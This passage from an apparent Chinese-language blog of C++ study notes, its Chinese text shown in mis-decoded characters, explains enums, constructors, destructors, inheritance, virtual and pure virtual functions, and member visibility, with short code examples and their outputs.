e2;</span><br><span class="line">  e2.x = <span class="number">5</span>;</span><br><span class="line">  e2.y = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  e1.<span class="built_in">print</span>();</span><br><span class="line">  e2.<span class="built_in">print</span>();</span><br><span class="line">  <span class="comment">// Entity::print(); å¦‚æœæˆå‘˜æ–¹æ³•ä¸åŠ staticä¸èƒ½è¿™æ ·: è°ƒç”¨éé™æ€æˆå‘˜å‡½æ•°éœ€è¦ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">  <span class="comment">// å¦‚æœåŠ ä¸Šstatic, æ—¢å¯é€šè¿‡å¯¹è±¡,åˆå¯é€šè¿‡Entity::print();</span></span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// === è¾“å‡º ===</span></span><br><span class="line">x = <span class="number">5</span> y = <span class="number">8</span></span><br><span class="line">x = <span class="number">5</span> y = <span class="number">8</span></span><br></pre></td></tr></table></figure><h1 id="23-ENUMS-in-C">23 ENUMS in C++</h1><p>enumeration æ˜¯ä¸€ç»„å€¼çš„é›†åˆï¼Œæ˜¯ä¸€ç§<strong>å‘½åå€¼çš„æ–¹å¼</strong>ï¼ˆæšä¸¾æ•°å…¶å®å°±æ˜¯ä¸€ä¸ª<strong>æ•´æ•°</strong>ï¼‰ã€‚<br>å½“æƒ³ä½¿ç”¨æ•´æ•°æ¥è¡¨ç¤ºæŸäº›çŠ¶æ€æˆ–æŸäº›æ•°å€¼æ—¶ï¼Œå®ƒéå¸¸æœ‰ç”¨ã€‚</p><ul><li>ç¬¬ä¸€ä¸ªå…ƒç´ é»˜è®¤æ˜¯0ï¼Œç¬¬äºŒä¸ªå¾€åé»˜è®¤å¢1</li><li>enumå…ƒç´ ç±»å‹é»˜è®¤æ˜¯intï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ä¿®æ”¹ä¸º<code>unsigned char</code></li><li>ç¬¬6è¡Œåvalueçš„ç±»å‹å¯ä»¥å†™ unsigned charï¼Œä¹Ÿå¯ä»¥å†™Example**ï¼Œå†™åè€…çš„è¯å°±é™åˆ¶åœ¨Aã€Bã€Cä¸‰ä¸ªå€¼ä¸­ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç»•è¿‡ï¼‰**ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Example</span> : <span class="type">unsigned</span> <span class="type">char</span> &#123;</span><br><span class="line">  A = <span class="number">5</span>, B, C</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Example value = B;</span><br><span class="line">  <span class="keyword">if</span> (value == <span class="number">6</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;value = 6&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç»™å‡ºä¸€ä¸ªæ›´åå®é™…çš„ä¾‹å­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Log</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">enum</span>  <span class="title class_">Level</span> &#123;</span><br><span class="line">LevelError = <span class="number">0</span>, LevelWarning, LevelInfo  <span class="comment">// ä¸è¦ç”¨Error: å’ŒErrorå‡½æ•°åŒå</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Level m_LogLevel = LevelInfo;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetLevel</span><span class="params">(Level level)</span> </span>&#123;</span><br><span class="line">m_LogLevel = level;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Error</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelError) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[ERROR]:&quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Warn</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelWarning) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[WARNING]:&quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Info</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelInfo) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[INFO]:&quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Log log;</span><br><span class="line">log.<span class="built_in">SetLevel</span>(Log::LevelError);  <span class="comment">// è¿™é‡ŒLevelåªæ˜¯æ™®é€šçš„æšä¸¾æ•°ï¼Œä¸æ˜¯æšä¸¾ç±»ï¼ŒLevelä¸æ˜¯çœŸæ­£çš„å‘½åç©ºé—´</span></span><br><span class="line">log.<span class="built_in">Error</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">log.<span class="built_in">Warn</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">log.<span class="built_in">Info</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="24-Constructors-in-C">24 Constructors in C++</h1><p>æ„é€ å‡½æ•°æœ€é€šç”¨ç”¨æ³•ï¼šåˆ›å»ºç±»çš„å®ä¾‹æ—¶<strong>åˆå§‹åŒ–è¯¥ç±»ï¼Œç¡®ä¿åˆå§‹åŒ–äº†æ‰€æœ‰çš„å†…å­˜</strong>ã€‚</p><p>Javaç­‰è¯­è¨€å¯¹äºæ•°æ®åŸºæœ¬ç±»å‹ï¼Œæ¯”å¦‚intå’Œfloatä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸º0ï¼Œä½†æ˜¯C++ä¸ä¼šï¼Œå¿…é¡»æ‰‹åŠ¨åˆå§‹åŒ–æ‰€æœ‰åŸºæœ¬ç±»å‹ã€‚</p><p>å¯ä»¥å†™å¤šä¸ªæ„é€ å‡½æ•°ï¼Œå‰ææ˜¯å®ƒä»¬æœ‰ä¸åŒçš„å‚æ•°ï¼ˆå‡½æ•°é‡è½½ï¼š<strong>åŒåŸŸ</strong>ä¸‹çš„åŒåå‡½æ•°çš„ä¸åŒç‰ˆæœ¬ï¼‰ã€‚</p><p><strong>è‹¥ä¸å®ä¾‹åŒ–å¯¹è±¡ï¼Œå°†ä¸ä¼šè¿è¡Œæ„é€ æ–¹æ³•ï¼Œæ¯”å¦‚åªä½¿ç”¨ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ã€‚</strong><br>å½“ä½¿ç”¨newåˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè°ƒç”¨æ„é€ æ–¹æ³•ã€‚</p><blockquote><p>ğŸ’¡ <strong>åˆ é™¤æ„é€ å‡½æ•°çš„æ–¹æ³•ï¼š</strong></p><ol><li>è®¾ç½®privateéšè—æ„é€ å‡½æ•°</li><li><code>Log() = delete;</code></li></ol></blockquote><h1 id="25-Destructors-in-C">25 Destructors in C++</h1><p>ä»»ä½•æ—¶å€™ï¼Œä¸€ä¸ªå¯¹è±¡è¦è¢«é”€æ¯æ—¶ï¼Œææ„å‡½æ•°å°†è¢«è°ƒç”¨ã€‚</p><p>ææ„å‡½æ•°åŒæ ·é€‚ç”¨äºå †å’Œæ ˆåˆ†é…çš„å¯¹è±¡ï¼Œå †ï¼šè°ƒç”¨deleteæ—¶ææ„å‡½æ•°å°†è¢«è°ƒç”¨ï¼›æ ˆï¼šå½“ä½œç”¨åŸŸç»“æŸæ—¶ï¼Œæ ˆå¯¹è±¡å°†è¢«åˆ é™¤â€”â€”ä¸è¦ä¸»åŠ¨è°ƒç”¨ï¼Œ<strong>å¦åˆ™ä¼šé€ æˆdouble destruct</strong>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">float</span> X, Y;</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    X = <span class="number">0.0f</span>, Y = <span class="number">0.0f</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">float</span> x, <span class="type">float</span> y) &#123;  <span class="comment">// é‡è½½æ„é€ å‡½æ•°</span></span><br><span class="line">    X = x, Y = y;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; X &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; Y &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">Entity <span class="title">e</span><span class="params">(<span class="number">0.1</span>, <span class="number">9.9</span>)</span></span>;</span><br><span class="line">  e.<span class="built_in">Print</span>();  <span class="comment">// ä½œç”¨åŸŸç»“æŸæ—¶ï¼Œæ ˆå¯¹è±¡è¢«åˆ é™¤ï¼Œææ„å‡½æ•°è¢«è°ƒç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Function</span>();</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="26-Inheritance">26 Inheritance</h1><p><strong>ç»§æ‰¿ï¼šé¿å…ä»£ç é‡å¤ï¼Œæ‰©å±•ç°æœ‰ç±»å¹¶ä¸ºåŸºç±»æä¾›æ–°åŠŸèƒ½çš„ä¸€ç§æ–¹å¼ã€‚</strong></p><p>çˆ¶ç±»æ˜¯å­ç±»çš„å­é›†ï¼Œå­ç±»æ˜¯çˆ¶ç±»çš„è¶…é›†ã€‚å¦‚æœå¼€å§‹é‡å†™å‡½æ•°å’ŒPlayerç±»ï¼Œå°±éœ€è¦ç»´æŠ¤ä¸€ä¸ªè™šå‡½æ•°è¡¨ï¼ˆVè¡¨ï¼‰ï¼Œéœ€è¦é¢å¤–å ç”¨å†…å­˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">float</span> X, Y;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span> </span>&#123;</span><br><span class="line">    X = x, Y = y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* name;  <span class="comment">// x86ä¸‹ä¸º4å­—èŠ‚ï¼Œx64ä¸‹åœ°å€å 8å­—èŠ‚</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="keyword">sizeof</span> Entity &lt;&lt; std::endl;</span><br><span class="line">  std::cout &lt;&lt; <span class="keyword">sizeof</span> Player &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  Player player;</span><br><span class="line">  player.<span class="built_in">move</span>(<span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">  player.X = <span class="number">2</span>;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸Šè¿°ä»£ç ä¸­ <code>sizeof Player</code> çš„ç»“æœåœ¨x86å’Œx64ä¸‹ä¸åŒï¼Œåœ°å€ä½æ•°ä¸åŒã€‚</p><p><strong>å¤šæ€ï¼šä½¿ç”¨ä¸€ç§ç±»å‹è¡¨ç¤ºå¤šç§ç±»å‹ï¼Œæ¯”å¦‚Playerä¸åªæ˜¯Playerä¹Ÿæ˜¯Entity</strong>ï¼Œå¯ä»¥åœ¨ä»»ä½•éœ€è¦ä½¿ç”¨Entityçš„åœ°æ–¹ä½¿ç”¨Playerã€‚</p><h1 id="27-Virtual-Functions">27 Virtual Functions</h1><p>è™šå‡½æ•°å…è®¸åœ¨å­ç±»ä¸­é‡å†™æ–¹æ³•ï¼šè‹¥Bæ˜¯Açš„å­ç±»ï¼Œå¯ä»¥åœ¨Aç±»ä¸­åˆ›å»ºä¸€ä¸ªæ–¹æ³•ï¼Œæ ‡è®°ä¸ºvirtualï¼Œå¯é€‰æ‹©åœ¨Bç±»ä¸­é‡å†™é‚£ä¸ªæ–¹æ³•ï¼Œè®©å®ƒåšå…¶ä»–äº‹æƒ…ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">std::string <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Entity&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Player</span>(<span class="type">const</span> std::string &amp;name)</span><br><span class="line">    : <span class="built_in">m_name</span>(name) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">std::string <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> m_name; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity* e = <span class="keyword">new</span> <span class="built_in">Entity</span>();</span><br><span class="line">  std::cout &lt;&lt; e-&gt;<span class="built_in">getName</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  Player* p = <span class="keyword">new</span> <span class="built_in">Player</span>(<span class="string">&quot;JKA&quot;</span>);</span><br><span class="line">  std::cout &lt;&lt; p-&gt;<span class="built_in">getName</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  Entity* entity = p;</span><br><span class="line">  std::cout &lt;&lt; entity-&gt;<span class="built_in">getName</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- è¾“å‡º ---</span></span><br><span class="line">Entity</span><br><span class="line">JKA</span><br><span class="line">Entity </span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ Playerç±»å‹çš„pè¢«èµ‹å€¼ç»™å£°æ˜ä¸ºEntityçš„å˜é‡ï¼Œè°ƒç”¨getName()çš„æ˜¯Entityçš„getName()ã€‚</p><p>åŸå› ï¼šé€šå¸¸åœ¨æˆ‘ä»¬å£°æ˜å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬çš„æ–¹æ³•é€šå¸¸åœ¨ç±»å†…éƒ¨èµ·ä½œç”¨ï¼Œç„¶åå½“è¦è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨å±äºè¯¥ç±»çš„æ–¹æ³•ã€‚å¯ä»¥é€šè¿‡è™šå‡½æ•°è§£å†³æ­¤é—®é¢˜ã€‚</p><p><strong>è™šå‡½æ•°å¼•å…¥äº†ä¸€ç§ç§°ä¸ºDynamic Dispatchï¼ˆåŠ¨æ€è”ç¼–ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒé€šå¸¸é€šè¿‡vè¡¨ï¼ˆè™šå‡½æ•°è¡¨ï¼‰æ¥å®ç°ç¼–è¯‘ï¼Œvè¡¨å°±æ˜¯ä¸€ä¸ªè¡¨ï¼Œå®ƒåŒ…å«åŸºç±»ä¸­æ‰€æœ‰è™šå‡½æ•°çš„æ˜ å°„ï¼Œè¿™æ ·å°±å¯åœ¨è¿è¡Œæ—¶å°†å®ƒä»¬æ˜ å°„åˆ°æ­£ç¡®çš„è¦†å†™ï¼ˆoverrideï¼‰å‡½æ•°ã€‚</strong><br>å¦‚æœæƒ³è¦†å†™ä¸€ä¸ªå‡½æ•°ï¼Œå¿…é¡»å°†åŸºç±»ä¸­çš„åŸºå‡½æ•°æ ‡è®°ä¸ºè™šå‡½æ•°ï¼š</p><ol><li>çˆ¶ç±»åŠ ä¸Švirtualå…³é”®å­—ã€‚</li><li>å­ç±»åŠ ä¸Šoverrideå…³é”®å­—ï¼ˆC++11ï¼‰ï¼Œå¥½å¤„ï¼š1.æ˜“è¯»ï¼›2.å‡å°‘é”™è¯¯ï¼šå¦‚æœå‡½æ•°åç§°å†™é”™äº†â€”â€”å’Œçˆ¶ç±»å‡½æ•°åä¸åŒï¼Œå°±æŠ¥é”™æé†’ã€‚</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> std::string <span class="title">GetName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Entity&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Player</span>(<span class="type">const</span> std::string &amp;name)</span><br><span class="line">    : <span class="built_in">m_name</span>(name) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">std::string <span class="title">GetName</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> m_name; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- è¾“å‡º ---</span></span><br><span class="line">Entity</span><br><span class="line">JKA</span><br><span class="line">JKA</span><br></pre></td></tr></table></figure><p>è™šå‡½æ•°æœ‰ä¸¤ç§<strong>è¿è¡Œæ—¶æˆæœ¬</strong>ï¼š</p><ol><li><strong>å­˜å‚¨vè¡¨</strong>å†…å­˜ï¼šåŸºç±»ä¸­è¦æœ‰ä¸€ä¸ªæˆå‘˜æŒ‡é’ˆï¼ŒæŒ‡å‘vè¡¨ã€‚</li><li>æ¯æ¬¡è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œéœ€è¦<strong>éå†</strong>è¿™ä¸ªè¡¨ï¼Œæ¥ç¡®å®šæ˜ å°„åˆ°å“ªä¸ªå‡½æ•°ã€‚</li></ol><h1 id="28-Interfaces-in-C-Pure-Virtual-Functions">28 Interfaces in C++ (Pure Virtual Functions)</h1><p>C++ä¸­<strong>çº¯è™šå‡½æ•°å…è®¸æˆ‘ä»¬åœ¨åŸºç±»ä¸­å®šä¹‰ä¸€ä¸ªæ²¡æœ‰å®ç°çš„å‡½æ•°ï¼Œç„¶åå¼ºåˆ¶å­ç±»å»å®ç°è¯¥å‡½æ•°</strong>ã€‚ç¡®ä¿æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªç‰¹å®šçš„æ–¹æ³•ï¼Œå¯ä»¥å°†è¯¥æŠ½è±¡ç±»ä½œä¸ºå‚æ•°ï¼ˆç±»å‹ï¼‰æ”¾å…¥ä¸€ä¸ªé€šç”¨å‡½æ•°ä¸­ã€‚C++11ä¸­æ— interfaceå…³é”®å­—ï¼Œå…¶å®è¿˜æ˜¯ä¸€ä¸ªç±»ï¼Œ<strong>åªä¸è¿‡æœ‰ä¸€ä¸ªæœªå®ç°çš„è™šå‡½æ•°ã€‚</strong></p><p>ç±»ä¸­çš„æ¥å£åªåŒ…å«æœªå®ç°çš„æ–¹æ³•ï¼Œä½œä¸ºæ¨¡ç‰ˆã€‚<br>ç”±äºæ­¤æ¥å£ç±»å®é™…ä¸åŒ…å«æ–¹æ³•å®ç°ï¼Œå®é™…ä¸Šä¸å¯èƒ½å®ä¾‹åŒ–é‚£ä¸ªç±»ï¼Œåœ¨å­ç±»ä¸­å®ç°åå¯ä»¥å®ä¾‹åŒ–ã€‚</p><p>çº¯è™šå‡½æ•°åº”è¯¥ç†è§£ä¸º<strong>è™šå‡½æ•° + ç±»ä¸å¯å®ä¾‹åŒ–æ ‡è®°ã€‚</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Printable</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> std::string <span class="title">GetClasName</span><span class="params">()</span> </span>= <span class="number">0</span>;  <span class="comment">// å‡½æ•°ä½“=0ï¼Œè¡¨ç¤ºä¸ºçº¯è™šå‡½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="29-Visibility-in-C">29 Visibility in C++</h1><p>å¯è§æ€§æŒ‡ç±»çš„æŸäº›æˆå‘˜æˆ–è€…æ–¹æ³•å®é™…ä¸Šæœ‰å¤šå¯è§ï¼Œæ˜¯å¯¹ç¨‹åºå®é™…è¿è¡Œæ–¹å¼å®Œå…¨æ²¡æœ‰å½±å“çš„ä¸œè¥¿ï¼Œå¯¹ç¨‹åºçš„æ€§èƒ½å’Œç±»ä¼¼çš„ä¸œè¥¿ä¹Ÿæ²¡æœ‰å½±å“ï¼ˆå¯è§æ€§ä¸æ˜¯cpuéœ€è¦ç†è§£çš„ä¸œè¥¿ï¼‰ã€‚</p><p>C++ä¸­æœ‰ä¸‰ä¸ªåŸºç¡€çš„å¯è§æ€§ä¿®é¥°ç¬¦ï¼š<code>private</code>ã€<code>protected</code> å’Œ <code>public</code>ï¼Œclassä¸­å¦‚æœä¸å†™åˆ™é»˜è®¤ä¸ºprivateï¼Œstructä¸­é»˜è®¤ä¸ºpublicã€‚<br>æ‰©å±•ï¼šJavaä¸­è¿˜å¯ä»¥ä½¿ç”¨defaultï¼ˆä¸å†™ï¼‰å¯è§ä¿®é¥°ç¬¦ï¼ŒC#ä¸­è¿˜æœ‰internalã€‚</p><ul><li>privateæ„å‘³ç€åªæœ‰<strong>å‹å…ƒ</strong>å’Œ<strong>ç›®æ ‡ç±»å¯ä»¥è®¿é—®privateå˜é‡ï¼Œå­ç±»ä¹Ÿä¸èƒ½è®¿é—®</strong>ã€‚<br>åœ¨C++ä¸­æœ‰ä¸ªå«friendçš„ä¸œè¥¿ï¼Œå¯è®©å…¶ä»–ç±»æˆ–è€…å‡½æ•°æˆä¸ºç›®æ ‡ç±»çš„å‹å…ƒï¼Œå®é™…ä¸Šå¯ä»¥ä»ç±»ä¸­è®¿é—®ç§æœ‰æˆå‘˜ã€‚</li><li><strong>protectedæ„å‘³ç€ç›®æ 